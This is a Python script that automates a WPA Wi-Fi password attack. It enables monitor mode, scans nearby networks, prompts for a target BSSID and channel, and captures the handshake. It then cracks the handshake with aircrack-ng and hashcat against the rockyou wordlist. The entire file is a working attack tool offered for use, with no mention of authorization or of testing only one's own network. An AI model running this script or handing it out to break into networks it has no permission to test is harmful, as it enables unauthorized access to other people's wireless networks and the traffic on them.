#!/usr/bin/env python3
import subprocess
import time

# Variables
INTERFACE = "wlan0"  # Replace with your wireless interface
MONITOR_INTERFACE = "wlan0mon"
WORDLIST = "/usr/share/wordlists/rockyou.txt"  # Replace with your wordlist path
HANDSHAKE_FILE = "capture_file"
HASH_FILE = "wpa_handshake.hc22000"

def enable_monitor_mode():
    """Enable monitor mode on the wireless interface."""
    print("[+] Enabling monitor mode...")
    subprocess.run(["airmon-ng", "start", INTERFACE], check=True)

def scan_networks():
    """Scan for nearby Wi-Fi networks and return the BSSID and channel of the target network."""
    print("[+] Scanning for nearby networks...")
    scan_process = subprocess.Popen(["airodump-ng", MONITOR_INTERFACE], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Let it run for 10 seconds to gather networks
    time.sleep(10)
    scan_process.terminate()
    stdout, _ = scan_process.communicate()

    # Display networks and prompt user to select target
    print(stdout)
    target_bssid = input("Enter the BSSID of the target network: ").strip()
    target_channel = input("Enter the channel of the target network: ").strip()
    return target_bssid, target_channel

def capture_handshake(target_bssid, target_channel):
    """Capture the handshake of the target network."""
    print(f"[+] Capturing handshake for BSSID: {target_bssid} on channel {target_channel}...")
    airodump_process = subprocess.Popen(
        ["airodump-ng", "--bssid", target_bssid, "--channel", target_channel, "--write", HANDSHAKE_FILE, MONITOR_INTERFACE],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    
    # Wait for handshake capture (user must manually stop this process)
    input("Press Enter to stop capturing once the handshake is captured...")
    airodump_process.terminate()
    print("[+] Handshake capture complete.")

def crack_with_aircrack(target_bssid):
    """Crack the handshake using Aircrack-ng."""
    print("[+] Cracking the handshake with Aircrack-ng...")
    subprocess.run(["aircrack-ng", "-w", WORDLIST, "-b", target_bssid, f"{HANDSHAKE_FILE}-01.cap"], check=True)

def convert_to_hashcat():
    """Convert the handshake to Hashcat format."""
    print("[+] Converting handshake to Hashcat format...")
    subprocess.run(["hcxpcapngtool", "-o", HASH_FILE, f"{HANDSHAKE_FILE}-01.cap"], check=True)

def crack_with_hashcat():
    """Crack the handshake using Hashcat."""
    print("[+] Cracking the handshake with Hashcat...")
    subprocess.run(["hashcat", "-m", "22000", HASH_FILE, WORDLIST, "--force"], check=True)
    print("[+] Cracking complete. Results:")
    subprocess.run(["hashcat", "-m", "22000", HASH_FILE, "--show"], check=True)

def disable_monitor_mode():
    """Disable monitor mode."""
    print("[+] Disabling monitor mode...")
    subprocess.run(["airmon-ng", "stop", MONITOR_INTERFACE], check=True)

def main():
    try:
        # Step 1: Enable monitor mode
        enable_monitor_mode()

        # Step 2: Scan for networks and get target BSSID and channel
        target_bssid, target_channel = scan_networks()

        # Step 3: Capture the handshake
        capture_handshake(target_bssid, target_channel)

        # Step 4: Crack the handshake with Aircrack-ng
        crack_with_aircrack(target_bssid)

        # Step 5: Convert handshake to Hashcat format
        convert_to_hashcat()

        # Step 6: Crack the handshake with Hashcat
        crack_with_hashcat()

    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e}")
    finally:
        # Step 7: Disable monitor mode
        disable_monitor_mode()
        print("[+] Process complete.")

if __name__ == "__main__":
    main()